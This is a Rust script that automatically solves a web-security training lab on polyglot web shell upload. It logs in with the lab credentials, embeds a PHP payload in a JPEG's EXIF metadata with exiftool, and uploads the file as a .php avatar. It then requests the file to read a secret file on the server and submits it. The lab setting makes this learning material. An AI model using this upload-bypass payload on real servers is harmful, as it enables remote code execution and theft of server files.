/********************************************************************************
*
* Lab: Remote code execution via polyglot web shell upload
*
* Hack Steps: 
*      1. Fetch login page
*      2. Extract the csrf token and session cookie
*      3. Login as wiener
*      4. Extract the new csrf token from wiener profile
*      5. Embed the payload in the image using exiftool
*      6. Change the extension of the image to .php
*      7. Read the image with embedded payload
*      8. Upload the image with the embedded payload
*      9. Fetch the uploaded image with the embedded payload to read the secret
*      10. Submit the solution
*
*********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{
        multipart::{Form, Part},
        Client, ClientBuilder, Response,
    },
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    fs,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0af1004f04134622830a196400a00018.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ");
    flush_terminal();

    let login_as_wiener = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting the new csrf token from wiener profile.. ");
    flush_terminal();

    session = get_session_cookie(&login_as_wiener);
    let wiener_profile = fetch_with_session("/my-account", &session);
    csrf_token = get_csrf_token(wiener_profile);

    println!("{}", "OK".green());
    print!("⦗5⦘ Embedding the payload in the image using exiftool.. ",);
    flush_terminal();

    let image_name = "white.jpg"; // Make sure that an image with this name exists in the root directory or change the name accordingly
    let payload = r###"<br><h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>"###;
    let mut args = [&format!("-DocumentName={payload}"), image_name];
    execute_shell_command("exiftool", &args); // Command: ~$ exiftool -DocumentName="<br> <h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>" ./white.jpg

    println!("{}", "OK".green());
    print!("⦗6⦘ Changing the extension of the image to .php.. ");
    flush_terminal();

    let malicious_image_name = "hack.php"; // You can change this to what you want
    args = [image_name, malicious_image_name];
    execute_shell_command("mv", &args); // If you are still a windows user, changing 'mv' to 'move' should make the script still work

    println!("{}", "OK".green());
    print!("⦗7⦘ Reading the image with embedded payload.. ");
    flush_terminal();

    let malicious_image = read_image(malicious_image_name);
    let avatar = build_avatar(malicious_image, malicious_image_name);
    let form = build_form(avatar, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗8⦘ Uploading the image with the embedded payload.. ");
    flush_terminal();

    upload_image(&session, form);

    println!("{}", "OK".green());
    print!("⦗9⦘ Fetching the uploaded image with the embedded payload to read the secret.. ");
    flush_terminal();

    let uploaded_image =
        fetch_with_session(&format!("/files/avatars/{malicious_image_name}"), &session);
    let body = uploaded_image.text().unwrap();
    let secret = capture_pattern_from_text("Secret: (.*)", &body);

    println!("{}", "OK".green());
    println!("❯❯ {} {}", "Secret:".blue(), secret.yellow());
    print!("⦗10⦘ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&secret);

    println!("{}", "OK".green());
    print!("⦗#⦘ Changing the image extension back to its original one..");
    flush_terminal();

    args = [malicious_image_name, image_name];
    execute_shell_command("mv", &args); // If you are still a windows user, changing 'mv' to 'move' should make the script still work

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green());
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn execute_shell_command(command: &str, args: &[&str]) {
    process::Command::new(command)
        .args(args)
        .output()
        .expect(&format!(
            "⦗!⦘ Failed to execute the command: {}",
            command.red()
        ));
}

fn read_image(image_path: &str) -> Vec<u8> {
    fs::read(image_path).expect(&format!(
        "{}",
        "⦗!⦘ Failed to read the image with the embedded payload".red()
    ))
}

fn build_avatar(file: Vec<u8>, file_name: &str) -> Part {
    Part::bytes(file)
        .file_name(file_name.to_owned())
        .mime_str("application/x-php")
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to construct the avatar part of the request".red()
        ))
}

fn build_form(avatar: Part, csrf_token: &str) -> Form {
    Form::new()
        .part("avatar", avatar)
        .text("user", "wiener")
        .text("csrf", csrf_token.to_owned())
}

fn upload_image(session: &str, form: Form) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/my-account/avatar"))
        .header("Cookie", format!("session={session}"))
        .multipart(form)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to upload the image with the embedded payload".red()
        ));
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap()
}
